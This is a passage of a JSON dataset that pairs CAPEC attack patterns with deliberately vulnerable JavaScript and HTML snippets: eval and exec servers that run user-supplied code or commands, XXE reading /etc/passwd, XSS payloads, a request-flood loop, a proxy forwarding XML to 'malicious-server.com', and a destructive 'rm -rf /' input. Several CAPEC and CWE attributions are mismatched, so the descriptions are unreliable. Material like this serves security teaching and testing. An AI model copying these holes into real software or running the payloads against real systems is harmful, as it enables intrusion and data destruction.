</body>\n</message>`;\n\nsendRequest(spoofedXmlMessage);",
        "description": "This JavaScript code snippet demonstrates a scenario where an attacker can spoof a UDDI/ebXML message to impersonate a service provider in an e-business transaction. The code lacks proper XML validation (CWE-112), insufficient verification of data authenticity (CWE-345), incorrectly specified destination in a communication channel (CWE-941), improper enforcement of message integrity during transmission (CWE-924), and allows the communication channel to be accessed by non-endpoints (CWE-300). The `sendRequest` function processes an XML message without proper validation and sends it to a potentially malicious URL, demonstrating how an attacker could exploit these weaknesses to manipulate or intercept communications."
    },
    {
        "capec_id": "219",
        "capec_name": "XML Routing Detour Attacks",
        "code_snippet": "const http = require('http');\nconst xml2js = require('xml2js');\n\nconst server = http.createServer((req, res) => {\n  let body = '';\n  req.on('data', chunk => { body += chunk; });\n  req.on('end', () => {\n    xml2js.parseString(body, (err, result) => {\n      if (err) {\n        res.writeHead(400, { 'Content-Type': 'text/plain' });\n        res.end('Invalid XML');\n        return;\n      }\n\n      // CWE-112: Missing XML Validation\n      // No schema validation is performed here\n\n      // CWE-611: Improper Restriction of XML External Entity Reference\n      // External entities are not disabled\n\n      // CWE-441: Unintended Proxy or Intermediary\n      // Forwarding the request to another server without preserving the original source\n      const options = {\n        hostname: 'malicious-server.com',\n        port: 80,\n        path: '/process',\n        method: 'POST',\n        headers: {\n          'Content-Type': 'application/xml'\n        }\n      };\n\n      const proxyReq = http.request(options, proxyRes => {\n        let proxyBody = '';\n        proxyRes.on('data', chunk => { proxyBody += chunk; });\n        proxyRes.on('end', () => {\n          res.writeHead(200, { 'Content-Type': 'application/xml' });\n          res.end(proxyBody);\n        });\n      });\n\n      proxyReq.on('error', e => {\n        res.writeHead(500, { 'Content-Type': 'text/plain' });\n        res.end('Proxy error');\n      });\n\n      proxyReq.write(body);\n      proxyReq.end();\n    });\n  });\n});\n\nserver.listen(8080, () => {\n  console.log('Server running on port 8080');\n});",
        "description": "This JavaScript code snippet creates an HTTP server that processes incoming XML requests. The server reads the XML data from the request, parses it using the xml2js library, and forwards the parsed XML to another server (malicious-server.com) without validating the XML against a schema (CWE-112) or disabling external entity references (CWE-611). This forwarding action makes the server act as an unintended proxy (CWE-441), potentially allowing an attacker to reroute and manipulate the XML processing. The code demonstrates how an attacker could exploit these weaknesses to perform an XML Routing Detour Attack (CAPEC-94)."
    },
    {
        "capec_id": "220",
        "capec_name": "Client-Server Protocol Manipulation",
        "code_snippet": "const net = require('net');\n\nconst client = new net.Socket();\nclient.connect(8080, '127.0.0.1', () => {\n    console.log('Connected');\n    // Weak algorithm selection (CWE-757)\n    client.write('ALGO:WEAK');\n});\n\nclient.on('data', (data) => {\n    console.log('Received: ' + data);\n    // Capture-replay vulnerability (CWE-294)\n    if (data.toString() === 'AUTH:SUCCESS') {\n        client.write('REPLAY:AUTH:SUCCESS');\n    }\n});\n\nclient.on('close', () => {\n    console.log('Connection closed');\n});\n\n// Incorrectly specified destination (CWE-941)\nclient.connect(8080, '192.168.1.1');\n\n// Direct use of sockets (CWE-246)\nconst server = net.createServer((socket) => {\n    socket.on('data', (data) => {\n        console.log('Server received: ' + data);\n        if (data.toString() === 'ALGO:WEAK') {\n            socket.write('AUTH:SUCCESS');\n        }\n    });\n});\nserver.listen(8080, '127.0.0.1');",
        "description": "This JavaScript code snippet demonstrates a client-server communication setup using the 'net' module, which directly uses sockets (CWE-246). The client connects to a server and selects a weak algorithm for communication (CWE-757). Upon receiving an 'AUTH:SUCCESS' message, the client replays this message to the server (CWE-294). Additionally, the client attempts to connect to an incorrect destination (CWE-941). This code embodies the main idea of CAPEC-272 (Client-Server Protocol Manipulation) by showcasing how weaknesses in the communication protocol can be exploited to perform unexpected actions."
    },
    {
        "capec_id": "221",
        "capec_name": "Data Serialization External Entities Blowup",
        "code_snippet": "const express = require('express');\nconst fs = require('fs');\nconst xml2js = require('xml2js');\n\nconst app = express();\napp.use(express.text());\n\napp.post('/upload', (req, res) => {\n  const parser = new xml2js.Parser({\n    explicitEntity: true\n  });\n\n  parser.parseString(req.body, (err, result) => {\n    if (err) {\n      res.status(400).send('Invalid XML');\n      return;\n    }\n\n    // Process the parsed XML\n    res.send('XML processed');\n  });\n});\n\napp.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
        "description": "This JavaScript code snippet sets up an Express server that accepts XML data via a POST request to the '/upload' endpoint. The xml2js library is used to parse the XML data. The parser is configured with 'explicitEntity: true', which allows external entities to be processed. This can be exploited by an attacker to include external entities that reference large or resource-intensive URIs, leading to a denial of service (DoS) condition. This snippet embodies the main idea of the CAPEC 'Data Serialization External Entities Blowup' by demonstrating how improper handling of XML external entities can lead to resource exhaustion. The related CWEs provide additional context, such as improper restriction of XML external entity references (CWE-611) and improper control of resource identifiers (CWE-99)."
    },
    {
        "capec_id": "222",
        "capec_name": "iFrame Overlay",
        "code_snippet": "<html>\n<head>\n  <title>Vulnerable iFrame Example</title>\n</head>\n<body>\n  <h1>Welcome to Our Site</h1>\n  <iframe src=\"http://malicious-site.com\" style=\"position:absolute; top:0; left:0; width:100%; height:100%; opacity:0;\"></iframe>\n  <script>\n    // CWE-79: Cross-site Scripting (XSS) vulnerability\n    var userInput = '<img src=x onerror=alert(1)>'; // Malicious input\n    document.write(userInput); // Improper neutralization of input\n  </script>\n</body>\n</html>",
        "description": "This code snippet demonstrates an iFrame overlay attack (CAPEC-1021) where a malicious iFrame is overlaid on top of a legitimate web page, tricking the user into interacting with the malicious site. The iFrame is styled to be invisible (opacity:0) and covers the entire page (width:100%; height:100%). Additionally, the code includes a Cross-site Scripting (XSS) vulnerability (CWE-79) by improperly handling user input and directly writing it to the document, which could allow an attacker to execute arbitrary scripts. This combination of vulnerabilities can lead to user interface misrepresentation (CWE-451) and improper restriction of rendered UI layers or frames (CWE-1021)."
    },
    {
        "capec_id": "224",
        "capec_name": "Fingerprinting",
        "code_snippet": "const http = require('http');\n\nhttp.createServer((req, res) => {\n  if (req.url === '/version') {\n    res.writeHead(200, {'Content-Type': 'text/plain'});\n    res.end('Server Version: 1.0.0\\n');\n  } else if (req.url === '/debug') {\n    res.writeHead(200, {'Content-Type': 'text/plain'});\n    res.end('Debug Mode: ON\\n');\n  } else {\n    res.writeHead(404, {'Content-Type': 'text/plain'});\n    res.end('Not Found\\n');\n  }\n}).listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
        "description": "This JavaScript code creates an HTTP server that listens on port 8080. The server has two endpoints: '/version' and '/debug'. When accessed, '/version' reveals the server version, and '/debug' indicates that debug mode is on. This code snippet embodies the concept of fingerprinting (CAPEC-170) by exposing sensitive information about the server's version and debug status. This information can be used by an adversary to identify the system and potentially exploit known vulnerabilities. The code also touches on related CWEs, such as CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) and CWE-497 (Exposure of Sensitive System Information to an Unauthorized Control Sphere), by making sensitive system details accessible to unauthorized users."
    },
    {
        "capec_id": "226",
        "capec_name": "Session Credential Falsification through Manipulation",
        "code_snippet": "const http = require('http');\nconst server = http.createServer((req, res) => {\n  let cookies = parseCookies(req);\n  if (cookies.sessionID) {\n    // Assume sessionID is valid without validation\n    res.writeHead(200, {'Content-Type': 'text/plain'});\n    res.end('Welcome back, user!');\n  } else {\n    // Create a new session without invalidating old ones\n    let newSessionID = generateSessionID();\n    res.writeHead(200, {\n      'Set-Cookie': `sessionID=${newSessionID}; HttpOnly`,\n      'Content-Type': 'text/plain'\n    });\n    res.end('New session created.');\n  }\n});\n\nfunction parseCookies(request) {\n  let list = {},\n      rc = request.headers.cookie;\n\n  rc && rc.split(';').forEach(cookie => {\n    let parts = cookie.split('=');\n    list[parts.shift().trim()] = decodeURI(parts.join('='));\n  });\n\n  return list;\n}\n\nfunction generateSessionID() {\n  return Math.random().toString(36).substring(2, 15);\n}\n\nserver.listen(8080);",
        "description": "This JavaScript code snippet creates a simple HTTP server that handles session management using cookies. The server checks for the presence of a 'sessionID' cookie. If it exists, the server assumes it is valid without any validation (CWE-565). If the 'sessionID' cookie is not present, the server generates a new session ID without invalidating any existing session identifiers (CWE-384). The code also demonstrates insufficient session expiration (CWE-613) by not expiring old session IDs. This setup can be exploited by an attacker to manipulate session credentials and gain unauthorized access, embodying the main idea of CAPEC-139."
    },
    {
        "capec_id": "227",
        "capec_name": "Sustained Client Engagement",
        "code_snippet": "const http = require('http');\n\nconst options = {\n  hostname: 'target-server.com',\n  port: 80,\n  path: '/resource',\n  method: 'GET'\n};\n\nfunction engageResource() {\n  const req = http.request(options, res => {\n    res.on('data', chunk => {});\n    res.on('end', () => {\n      // Re-engage the resource immediately after the response ends\n      engageResource();\n    });\n  });\n\n  req.on('error', error => {\n    console.error(`Problem with request: ${error.message}`);\n  });\n\n  req.end();\n}\n\n// Start engaging the resource\nengageResource();",
        "description": "This JavaScript code snippet demonstrates a sustained client engagement attack on a target server. The code repeatedly sends HTTP GET requests to a specific resource on the target server. Each time a response is received, the resource is immediately re-engaged by sending another request. This continuous loop keeps the resource tied up, potentially denying legitimate users access to it. The code leverages the concept of 'Uncontrolled Resource Consumption' (CWE-400) and 'Allocation of Resources Without Limits or Throttling' (CWE-770) by not imposing any limits on the number of requests sent, thereby consuming server resources indefinitely."
    },
    {
        "capec_id": "228",
        "capec_name": "DTD Injection",
        "code_snippet": "const xml2js = require('xml2js');\nconst fs = require('fs');\n\nconst xmlData = `<?xml version=\"1.0\"?>\n<!DOCTYPE root [\n  <!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n]>\n<root>&xxe;</root>`;\n\nxml2js.parseString(xmlData, (err, result) => {\n  if (err) {\n    console.error('Error parsing XML:', err);\n  } else {\n    console.log('Parsed XML:', result);\n  }\n});",
        "description": "This JavaScript code snippet demonstrates a DTD Injection vulnerability using the xml2js library. The XML data includes a malicious DTD that defines an external entity 'xxe' which references the system file '/etc/passwd'. When the XML is parsed, the external entity is expanded, potentially exposing sensitive system files. This example highlights CWE-611 (Improper Restriction of XML External Entity Reference) and CWE-827 (Improper Control of Document Type Definition), showing how an attacker can inject malicious content into an application's DTD to cause resource depletion or unauthorized data access."
    },
    {
        "capec_id": "229",
        "capec_name": "Serialized Data Parameter Blowup",
        "code_snippet": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst xml2js = require('xml2js');\n\nconst app = express();\napp.use(bodyParser.text({ type: 'application/xml' }));\n\napp.post('/upload', (req, res) => {\n  const parser = new xml2js.Parser();\n  parser.parseString(req.body, (err, result) => {\n    if (err) {\n      res.status(400).send('Invalid XML');\n      return;\n    }\n    // Simulate processing of the parsed XML data\n    res.send('XML processed successfully');\n  });\n});\n\napp.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
        "description": "This JavaScript code snippet sets up an Express server that accepts XML data via a POST request. The XML data is parsed using the xml2js library. The code is vulnerable to a 'Serialized Data Parameter Blowup' attack (CAPEC-230) because it does not impose any limits on the size or complexity of the XML data being parsed. This can lead to a denial of service condition where CPU resources are exhausted. The related CWEs provide additional context: CWE-770 (no resource limits), CWE-611 (potential XML External Entity injection), and CWE-74 (improper neutralization of special elements). The code demonstrates how an attacker could exploit inefficient XML parsing to cause a denial of service."
    },
    {
        "capec_id": "230",
        "capec_name": "Serialized Data with Nested Payloads",
        "code_snippet": "const xml2js = require('xml2js');\n\nconst xmlData = `\n<root>\n  <item>\n    <subitem>\n      <subsubitem>\n        <subsubsubitem>\n          <!-- Nested payloads continue -->\n        </subsubsubitem>\n      </subsubitem>\n    </subitem>\n  </item>\n</root>`;\n\nfunction parseXML(data) {\n  const parser = new xml2js.Parser();\n  parser.parseString(data, (err, result) => {\n    if (err) {\n      console.error('Error parsing XML:', err);\n      return;\n    }\n    console.log('Parsed XML:', result);\n  });\n}\n\nparseXML(xmlData);",
        "description": "This JavaScript code snippet demonstrates a potential vulnerability related to 'Serialized Data with Nested Payloads' (CAPEC). The code uses the 'xml2js' library to parse an XML string that contains deeply nested elements. The XML data is structured in such a way that it could cause excessive memory consumption and CPU utilization when parsed, due to the uncontrolled recursion and lack of proper input validation (CWE-674, CWE-20). The parser does not validate the XML against a schema (CWE-112), and there are no limits on the depth of recursion or resource allocation (CWE-770). This example highlights the risk of processing untrusted XML data without proper validation and resource management."
    },
    {
        "capec_id": "231",
        "capec_name": "Oversized Serialized Data Payloads",
        "code_snippet": "const http = require('http');\nconst xml2js = require('xml2js');\n\nconst server = http.createServer((req, res) => {\n  let body = '';\n\n  req.on('data', chunk => {\n    body += chunk;\n    // CWE-770: No limit on the size of the data being received\n  });\n\n  req.on('end', () => {\n    xml2js.parseString(body, (err, result) => {\n      if (err) {\n        res.writeHead(400, {'Content-Type': 'text/plain'});\n        res.end('Invalid XML');\n        return;\n      }\n      // CWE-112: No XML schema validation\n      // CWE-674: Potential for uncontrolled recursion in XML parsing\n      res.writeHead(200, {'Content-Type': 'application/json'});\n      res.end(JSON.stringify(result));\n    });\n  });\n});\n\nserver.listen(3000, () => {\n  console.log('Server running at http://localhost:3000/');\n});",
        "description": "This JavaScript code snippet creates an HTTP server that listens for incoming requests and processes XML data. The server reads the incoming data without imposing any size limits (CWE-770), which can lead to resource exhaustion if an oversized payload is sent. The XML data is then parsed without any schema validation (CWE-112), making it vulnerable to maliciously crafted XML. Additionally, the XML parser may be susceptible to uncontrolled recursion (CWE-674), which can further exhaust system resources. This code embodies the main idea of the CAPEC by demonstrating how an adversary could exploit oversized serialized data payloads to exhaust system resources and potentially execute arbitrary code."
    },
    {
        "capec_id": "233",
        "capec_name": "Privilege Escalation",
        "code_snippet": "const userRole = 'guest';\n\nfunction performAdminTask() {\n  if (userRole !== 'admin') {\n    console.log('Access Denied: Insufficient Privileges');\n    return;\n  }\n  // Admin task code here\n  console.log('Admin task performed');\n}\n\nfunction elevatePrivileges() {\n  // Improper Privilege Management: Directly changing user role\n  userRole = 'admin';\n  console.log('Privileges elevated to admin');\n}\n\nelevatePrivileges();\nperformAdminTask();",
        "description": "This JavaScript code snippet demonstrates a privilege escalation vulnerability. Initially, the user role is set to 'guest'. The `performAdminTask` function checks if the user role is 'admin' before performing an admin task. However, the `elevatePrivileges` function improperly changes the user role to 'admin' without proper authorization checks, allowing a guest user to escalate their privileges and perform admin tasks. This example embodies the CAPEC concept of Privilege Escalation and highlights CWE-269 (Improper Privilege Management) by directly modifying the user role, leading to unauthorized actions."
    },
    {
        "capec_id": "234",
        "capec_name": "Hijacking a privileged process",
        "code_snippet": "const { exec } = require('child_process');\nconst fs = require('fs');\n\n// Incorrect Permission Assignment for Critical Resource (CWE-732)\nfs.chmodSync('/path/to/critical/resource', 0o777);\n\n// Execution with Unnecessary Privileges (CWE-250)\nexec('sudo some_privileged_command', (error, stdout, stderr) => {\n  if (error) {\n    console.error(`exec error: ${error}`);\n    return;\n  }\n  console.log(`stdout: ${stdout}`);\n  console.error(`stderr: ${stderr}`);\n});\n\n// Incorrect Use of Privileged APIs (CWE-648)\nexec('sudo another_privileged_command', (error, stdout, stderr) => {\n  if (error) {\n    console.error(`exec error: ${error}`);\n    return;\n  }\n  console.log(`stdout: ${stdout}`);\n  console.error(`stderr: ${stderr}`);\n});\n\n// Privilege Dropping / Lowering Errors (CWE-271)\nprocess.setuid(1000); // Attempt to drop privileges but may not be effective\n\n// Process Control (CWE-114)\nexec('some_command_from_untrusted_source', (error, stdout, stderr) => {\n  if (error) {\n    console.error(`exec error: ${error}`);\n    return;\n  }\n  console.log(`stdout: ${stdout}`);\n  console.error(`stderr: ${stderr}`);\n});",
        "description": "This JavaScript code snippet demonstrates several security weaknesses that could lead to hijacking a privileged process. The code includes: \n1. Incorrect Permission Assignment for Critical Resource (CWE-732) by setting overly permissive permissions on a critical resource.\n2. Execution with Unnecessary Privileges (CWE-250) by running commands with 'sudo' that may not require elevated privileges.\n3. Incorrect Use of Privileged APIs (CWE-648) by improperly using 'sudo' in exec calls.\n4. Privilege Dropping / Lowering Errors (CWE-271) by attempting to drop privileges but not ensuring it is done correctly.\n5. Process Control (CWE-114) by executing a command from an untrusted source, which could lead to executing malicious commands. \nThese weaknesses collectively illustrate how an attacker could hijack a privileged process to execute arbitrary code with elevated privileges."
    },
    {
        "capec_id": "235",
        "capec_name": "DEPRECATED: Implementing a callback to system routine (old AWT Queue)",
        "code_snippet": "const fs = require('fs');\nconst http = require('http');\n\nlet sharedResource = '';\n\nfunction unsafeCallback() {\n  // Simulate a privileged operation\n  sharedResource = fs.readFileSync('/etc/passwd', 'utf8');\n}\n\nhttp.createServer((req, res) => {\n  if (req.url === '/callback') {\n    // Vulnerable to hijacking\n    unsafeCallback();\n    res.writeHead(200, {'Content-Type': 'text/plain'});\n    res.end('Callback executed');\n  } else if (req.url === '/replay') {\n    // Vulnerable to replay attack\n    res.writeHead(200, {'Content-Type': 'text/plain'});\n    res.end(sharedResource);\n  } else {\n    res.writeHead(404, {'Content-Type': 'text/plain'});\n    res.end('Not Found');\n  }\n}).listen(8080);\n\nconsole.log('Server running at http://127.0.0.1:8080/');",
        "description": "This JavaScript code snippet demonstrates a vulnerable server that embodies the deprecated CAPEC pattern of implementing a callback to a system routine. The server has an endpoint '/callback' that executes an unsafe callback function, which reads a sensitive file ('/etc/passwd') and stores its content in a shared resource. This shared resource is then exposed via another endpoint '/replay', making it vulnerable to replay attacks. The code also highlights the use of a non-final static storable (sharedResource) in a multi-threaded context, which can lead to race conditions and improper synchronization issues."
    },
    {
        "capec_id": "236",
        "capec_name": "DEPRECATED: Catching exception throw/signal from privileged block",
        "code_snippet": "const fs = require('fs');\n\nprocess.on('SIGINT', () => {\n  try {\n    // Simulate privileged operation\n    let data = fs.readFileSync('/etc/shadow', 'utf8');\n    console.log(data);\n  } catch (err) {\n    // Unchecked error condition\n    console.error('Error reading file');\n  }\n});\n\n// Simulate a privileged operation\ntry {\n  let data = fs.readFileSync('/etc/shadow', 'utf8');\n  console.log(data);\n} catch (err) {\n  // Unchecked error condition\n  console.error('Error reading file');\n}",
        "description": "This JavaScript code snippet demonstrates a scenario where a signal handler (SIGINT) is used to catch an interrupt signal and perform a privileged operation, such as reading the '/etc/shadow' file, which contains sensitive information. The code also includes an unchecked error condition where errors are caught but not properly handled, potentially allowing an attacker to induce unexpected behavior unnoticed. This embodies the main idea of CAPEC-30 (Hijacking a Privileged Thread of Execution) and incorporates CWE-828 (Signal Handler with Functionality that is not Asynchronous-Safe) and CWE-391 (Unchecked Error Condition)."
    },
    {
        "capec_id": "237",
        "capec_name": "Escaping a Sandbox by Calling Code in Another Language",
        "code_snippet": "const { exec } = require('child_process');\n\nfunction executeNativeCode(command) {\n  exec(command, (error, stdout, stderr) => {\n    if (error) {\n      console.error(`Error: ${error.message}`);\n      return;\n    }\n    if (stderr) {\n      console.error(`Stderr: ${stderr}`);\n      return;\n    }\n    console.log(`Stdout: ${stdout}`);\n  });\n}\n\n// Example of calling native code from JavaScript\nexecuteNativeCode('ls -la');",
        "description": "This JavaScript code snippet demonstrates the concept of escaping a sandbox by calling code in another language. The `exec` function from the `child_process` module is used to execute native shell commands. This can be dangerous as it allows the execution of arbitrary system commands, potentially leading to a sandbox escape. The code also highlights CWE-111 (Direct Use of Unsafe JNI) by showing how JavaScript can call native code, which may perform unsafe operations. Additionally, it touches on CWE-537 (Java Runtime Error Message Containing Sensitive Information) by logging error messages that could expose sensitive information."
    },
    {
        "capec_id": "238",
        "capec_name": "DEPRECATED: Using URL/codebase / G.A.C. (code source) to convince sandbox of privilege",
        "code_snippet": "const http = require('http');\nconst url = require('url');\n\nconst server = http.createServer((req, res) => {\n  const parsedUrl = url.parse(req.url, true);\n  const pathname = parsedUrl.pathname;\n\n  // CWE-551: Authorization before parsing and canonicalization\n  if (!isAuthorized(req)) {\n    res.writeHead(403, {'Content-Type': 'text/plain'});\n    res.end('Forbidden');\n    return;\n  }\n\n  // CWE-424: Improper protection of alternate path\n  if (pathname === '/admin') {\n    res.writeHead(200, {'Content-Type': 'text/plain'});\n    res.end('Welcome to the admin panel');\n  } else {\n    res.writeHead(404, {'Content-Type': 'text/plain'});\n    res.end('Not Found');\n  }\n});\n\nfunction isAuthorized(req) {\n  // Simulate an authorization check\n  return req.headers['authorization'] === 'valid-token';\n}\n\nserver.listen(8080, () => {\n  console.log('Server is listening on port 8080');\n});",
        "description": "This JavaScript code snippet creates a simple HTTP server that demonstrates the vulnerability described in the deprecated CAPEC. The server checks for authorization before parsing and canonicalizing the URL (CWE-551). This can allow an attacker to bypass authorization by manipulating the URL. Additionally, the code does not sufficiently protect all possible paths (CWE-424), as it only checks for the '/admin' path and assumes any other path is unauthorized without proper validation. This snippet embodies the main idea of the deprecated CAPEC by showing how improper handling of URL parsing and authorization can lead to security vulnerabilities."
    },
    {
        "capec_id": "239",
        "capec_name": "DEPRECATED: Subversion of Authorization Checks: Cache Filtering, Programmatic Security, etc.",
        "code_snippet": "const isAuthenticated = localStorage.getItem('authToken') !== null;\n\nfunction accessSensitiveData() {\n  if (isAuthenticated) {\n    fetch('/sensitive-data')\n      .then(response => response.json())\n      .then(data => console.log(data));\n  } else {\n    console.log('Access denied. Please log in.');\n  }\n}\n\naccessSensitiveData();",
        "description": "This JavaScript code snippet demonstrates a vulnerability where client-side authentication is used to control access to sensitive data. The `isAuthenticated` variable is set based on the presence of an 'authToken' in the client's local storage. If the token is present, the client is considered authenticated and allowed to fetch sensitive data from the server. This approach is flawed because it relies solely on client-side checks, which can be easily bypassed by an attacker who modifies the client code or local storage. This embodies the main idea of the deprecated CAPEC related to subversion of authorization checks and highlights CWE-602 (Client-Side Enforcement of Server-Side Security) and CWE-603 (Use of Client-Side Authentication)."
    },
    {
        "capec_id": "240",
        "capec_name": "Resource Injection",
        "code_snippet": "const http = require('http');\nconst fs = require('fs');\n\nhttp.createServer((req, res) => {\n  const filePath = req.url.substring(1); // Extract file path from URL\n\n  // CWE-20: Improper Input Validation\n  // CWE-99: Improper Control of Resource Identifiers\n  // CWE-1285: Improper Validation of Specified Index, Position, or Offset in Input\n  // CWE-1289: Improper Validation of Unsafe Equivalence in Input\n  // CWE-913: Improper Control of Dynamically-Managed Code Resources\n  fs.readFile(filePath, (err, data) => {\n    if (err) {\n      res.writeHead(404, {'Content-Type': 'text/plain'});\n      res.write('File not found');\n      res.end();\n      return;\n    }\n    res.writeHead(200, {'Content-Type': 'text/plain'});\n    res.write(data);\n    res.end();\n  });\n}).listen(8080);",
        "description": "This JavaScript code snippet creates an HTTP server that reads and serves files based on the URL path provided by the client. The code is vulnerable to Resource Injection attacks due to improper input validation. Specifically, it directly uses the URL path as a file path without validating it, which can lead to unintended file access or modification. This embodies the main idea of CAPEC-99 (Resource Injection) and is related to several CWEs: CWE-20 (Improper Input Validation), CWE-99 (Improper Control of Resource Identifiers), CWE-1285 (Improper Validation of Specified Index, Position, or Offset in Input), CWE-1289 (Improper Validation of Unsafe Equivalence in Input), and CWE-913 (Improper Control of Dynamically-Managed Code Resources)."
    },
    {
        "capec_id": "241",
        "capec_name": "DEPRECATED: Code Injection",
        "code_snippet": "const http = require('http');\nconst url = require('url');\n\nhttp.createServer((req, res) => {\n  const queryObject = url.parse(req.url, true).query;\n  const userInput = queryObject.input;\n\n  // Vulnerable code: using eval with user input\n  try {\n    const result = eval(userInput);\n    res.writeHead(200, {'Content-Type': 'text/plain'});\n    res.end('Result: ' + result);\n  } catch (e) {\n    res.writeHead(400, {'Content-Type': 'text/plain'});\n    res.end('Error: ' + e.message);\n  }\n}).listen(8080);\n\nconsole.log('Server running at http://127.0.0.1:8080/');",
        "description": "This JavaScript code snippet creates an HTTP server that listens on port 8080. It parses the URL to extract a query parameter named 'input' and then uses the 'eval' function to execute this user-provided input. This is a classic example of a code injection vulnerability (CAPEC-242) because 'eval' executes the string as JavaScript code, which can be exploited by an attacker to run arbitrary code on the server. The use of 'eval' with user input is highly dangerous and should be avoided. Additionally, this code demonstrates the use of an obsolete function (CWE-477) as 'eval' is considered unsafe and its use is discouraged in modern JavaScript programming."
    },
    {
        "capec_id": "242",
        "capec_name": "Code Injection",
        "code_snippet": "const userInput = \"console.log('Hello, world!');\";\n\nfunction executeUserCode(code) {\n    eval(code);\n}\n\nexecuteUserCode(userInput);",
        "description": "This JavaScript code snippet demonstrates a code injection vulnerability. The `userInput` variable contains a string that represents code to be executed. The `executeUserCode` function takes this input and uses the `eval` function to execute it. This is a direct example of CWE-94 (Improper Control of Generation of Code) and CWE-77 (Improper Neutralization of Special Elements used in a Command). The `eval` function executes the string as code, which can be dangerous if the input is not properly sanitized, allowing an attacker to inject and execute arbitrary code."
    },
    {
        "capec_id": "243",
        "capec_name": "XSS Targeting HTML Attributes",
        "code_snippet": "<!DOCTYPE html>\n<html>\n<head>\n    <title>XSS Example</title>\n</head>\n<body>\n    <a href=\"#\" id=\"xssLink\">Click me</a>\n    <script>\n        // Simulating user input that is not properly sanitized\n        var userInput = '\" onmouseover=\"alert(\\'XSS Attack!\\')\"';\n        // Injecting the user input into an HTML attribute\n        document.getElementById('xssLink').setAttribute('href', 'javascript:void(0)' + userInput);\n    </script>\n</body>\n</html>",
        "description": "This code snippet demonstrates a Cross-Site Scripting (XSS) attack targeting HTML attributes. The user input is not properly sanitized and is directly injected into the 'href' attribute of an anchor tag. When the user hovers over the link, the malicious JavaScript code (alert('XSS Attack!')) is executed. This example embodies the main idea of CAPEC-86 and related CWEs, highlighting the risks of improper neutralization of script in HTML attributes."
    },
    {
        "capec_id": "244",
        "capec_name": "XSS Targeting URI Placeholders",
        "code_snippet": "<a href=\"javascript:alert('XSS')\">Click me</a>",
        "description": "This code snippet demonstrates a basic example of an XSS attack targeting URI placeholders. The anchor tag's href attribute contains a 'javascript:' URI scheme, which is a common vector for XSS attacks. When a user clicks on the link, the JavaScript code within the URI is executed, triggering an alert box. This example highlights the vulnerability described in CAPEC-139, where browsers interpret 'javascript:' URIs as executable content. The related CWEs emphasize the importance of properly neutralizing script content in attributes to prevent such attacks."
    },
    {
        "capec_id": "245",
        "capec_name": "XSS Using Doubled Characters",
        "code_snippet": "const userInput = '<<script>alert(\"XSS\")</script>';\nconst sanitizedInput = userInput.replace(/<</g, '<');\ndocument.body.innerHTML = sanitizedInput;",
        "description": "This JavaScript code snippet demonstrates a vulnerability to 'XSS Using Doubled Characters' as described in the CAPEC. The user input contains a doubled '<' character to bypass a naive input validation mechanism. The `replace` function attempts to sanitize the input by replacing '<<' with '<', but it fails to neutralize the script tag properly. As a result, the malicious script is executed when the sanitized input is inserted into the web page's DOM. This example highlights the importance of robust input validation and proper neutralization of special characters to prevent XSS attacks."
    },
    {
        "capec_id": "246",
        "capec_name": "DEPRECATED: XSS Using Flash",
        "code_snippet": "<html>\n<body>\n  <script>\n    // Incomplete denylist example\n    var userInput = \"<img src='x' onerror='alert(1)'>\";\n    var denylist = ['<script>', '</script>']; // Incomplete denylist\n    for (var i = 0; i < denylist.length; i++) {\n      userInput = userInput.replace(new RegExp(denylist[i], 'gi'), '');\n    }\n    document.write(userInput); // Vulnerable to XSS\n  </script>\n</body>\n</html>",
        "description": "This JavaScript code snippet demonstrates a vulnerable web application that attempts to use a denylist-based approach to prevent XSS attacks. The denylist is incomplete, only filtering out '<script>' and '</script>' tags, but not other potential XSS vectors such as the 'onerror' attribute in an 'img' tag. This allows an attacker to inject a malicious 'img' tag with an 'onerror' event handler that executes JavaScript code, leading to a stored XSS vulnerability. The code highlights the CWE-692 (Incomplete Denylist to Cross-Site Scripting) and CWE-82 (Improper Neutralization of Script in Attributes of IMG Tags in a Web Page) weaknesses."
    },
    {
        "capec_id": "247",
        "capec_name": "XSS Using Invalid Characters",
        "code_snippet": "const userInput = '<script>alert(\"XSS\");</script>';\nconst sanitizedInput = userInput.replace(/[\\x00-\\x1F\\x7F]/g, '');\ndocument.getElementById('output').innerHTML = sanitizedInput;",
        "description": "This JavaScript code snippet demonstrates a vulnerability related to 'XSS Using Invalid Characters'. The user input contains a script tag designed to execute an alert. The sanitization process attempts to remove invalid characters (control characters in this case) but fails to neutralize the script tags properly. This allows the script to be executed when the sanitized input is inserted into the HTML content of the page. The code highlights the risk of improper neutralization of invalid characters and special characters, leading to a potential XSS attack."
    },
    {
        "capec_id": "248",
        "capec_name": "Command Injection",
        "code_snippet": "const { exec } = require('child_process');\n\nfunction executeCommand(userInput) {\n  exec(`ls ${userInput}`, (error, stdout, stderr) => {\n    if (error) {\n      console.error(`exec error: ${error}`);\n      return;\n    }\n    console.log(`stdout: ${stdout}`);\n    console.error(`stderr: ${stderr}`);\n  });\n}\n\n// Example usage\nexecuteCommand(''); // Safe input\nexecuteCommand('&& rm -rf /'); // Malicious input",
        "description": "This JavaScript code snippet demonstrates a command injection vulnerability. The `executeCommand` function takes user input and directly incorporates it into an `exec` call to list directory contents using the `ls` command. If an attacker provides malicious input, such as `&& rm -rf /`, it can lead to the execution of unintended and potentially harmful commands. This example highlights the risks associated with improper neutralization of special elements (CWE-77, CWE-78) and improper handling of argument delimiters (CWE-88). The code does not validate or sanitize the user input, making it susceptible to command injection attacks."
    },
    {
        "capec_id": "249",
        "capec_name": "DEPRECATED: Linux Terminal Injection",
        "code_snippet": "const http = require('http');\nconst { exec } = require('child_process');\n\nhttp.createServer((req, res) => {\n  const userInput = req.url.split('?cmd=')[1];\n  if (userInput) {\n    exec(userInput, (error, stdout, stderr) => {\n      if (error) {\n        res.writeHead(500, {'Content-Type': 'text/plain'});\n        res.end(`Error: ${error.message}`);\n        return;\n      }\n      res.writeHead(200, {'Content-Type': 'text/plain'});\n      res.end(stdout);\n    });\n  } else {\n    res.writeHead(400, {'Content-Type': 'text/plain'});\n    res.end('No command provided');\n  }\n}).listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
